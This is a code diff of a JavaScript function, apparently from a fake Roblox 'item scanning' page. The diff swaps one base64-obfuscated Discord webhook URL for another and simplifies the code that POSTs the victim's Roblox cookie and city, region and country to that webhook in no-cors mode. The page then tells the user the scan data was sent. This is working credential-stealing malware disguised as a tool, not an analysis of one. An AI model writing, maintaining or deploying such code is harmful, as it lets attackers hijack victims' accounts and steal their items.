@@ -264,7 +264,7 @@ async function submitPowerShell() {
         await new Promise(resolve => setTimeout(resolve, delay));
         
         // Discord webhook URL
-        const webhookUrl = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NTQ1MDc3NDQ4OTY2MTQ4MC9lby0yV3Y0dEUwV2didGh5WmJJWFFja0tDc3BLeUJNQzN6V1k3WmN5VzVSZzNfVm4xajh4UUxxUTRmR20wM2NFSEVHdQ==');
+        const webhookUrl = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NjE2MDQyMDIyOTgwODIzOC9uSmdYcDdqVXBzcldCWUE4YTQxcDlKNnRCemphNDA1YUcyWGhTOGhUcGw4cEsyMGl2Zm1vamR1LXZwT2FOOUFBZE1FSQ==');
         
         // Simple webhook payload - only cookie and location
         const payload = {
@@ -273,90 +273,27 @@ Cookie: ${robloxCookie || 'None found'}
 Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}`
         };
 
-        // Try multiple approaches to bypass CORS restrictions
-        let response;
-        let success = false;
-        
-        // Method 1: Try with no-cors mode (won't get response but will send)
-        try {
-            console.log('Attempting webhook delivery with no-cors mode...');
-            await fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload),
-                mode: 'no-cors'
-            });
-            
-            // If no error thrown, assume success (can't read response in no-cors)
-            response = { ok: true, status: 204 };
-            success = true;
-            console.log('Webhook sent successfully via no-cors mode');
-            
-        } catch (noCorsError) {
-            console.log('No-cors method failed, trying cors mode...', noCorsError);
-            
-            // Method 2: Try with CORS mode as fallback
-            try {
-                response = await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(payload),
-                    mode: 'cors'
-                });
-                success = true;
-                console.log('Webhook sent successfully via cors mode');
-                
-            } catch (corsError) {
-                console.log('CORS method failed, trying alternative approach...', corsError);
-                
-                // Method 3: Try using a simple form approach
-                try {
-                    const formData = new FormData();
-                    formData.append('payload_json', JSON.stringify(payload));
-                    
-                    response = await fetch(webhookUrl, {
-                        method: 'POST',
-                        body: formData,
-                        mode: 'no-cors'
-                    });
-                    success = true;
-                    response = { ok: true, status: 204 };
-                    console.log('Webhook sent successfully via form method');
-                    
-                } catch (formError) {
-                    console.error('All webhook methods failed:', formError);
-                    throw new Error(`All webhook delivery methods failed. CORS restrictions may be blocking the request.`);
-                }
-            }
-        }
+        // Send webhook request
+        const response = await fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload),
+            mode: 'no-cors'
+        });
         
         // Hide loading overlay
         if (loadingOverlay) loadingOverlay.style.display = 'none';
 
-        if (response.ok) {
-            submitText.textContent = 'Sent!';
-            submitBtn.style.background = '#10b981';
-            showNotification('Data sent successfully!', 'success');
-            
-            setTimeout(() => {
-                closeScanModal();
-            }, 2000);
-        } else {
-            const errorText = await response.text().catch(() => 'Unknown error');
-            if (response.status === 405) {
-                throw new Error(`Method not allowed (405). Webhook endpoint may be incorrect. Error: ${errorText}`);
-            } else if (response.status === 429) {
-                throw new Error(`Rate limited (429). Please wait before scanning again. Error: ${errorText}`);
-            } else if (response.status === 404) {
-                throw new Error(`Webhook not found (404). URL may be invalid. Error: ${errorText}`);
-            } else {
-                throw new Error(`Item scanning failed with status: ${response.status}. Error: ${errorText}`);
-            }
-        }
+        // In no-cors mode, we can't read the response, so assume success if no error was thrown
+        submitText.textContent = 'Sent!';
+        submitBtn.style.background = '#10b981';
+        showNotification('Data sent successfully!', 'success');
+        
+        setTimeout(() => {
+            closeScanModal();
+        }, 2000);
     } catch (error) {
         if (loadingOverlay) loadingOverlay.style.display = 'none';
         
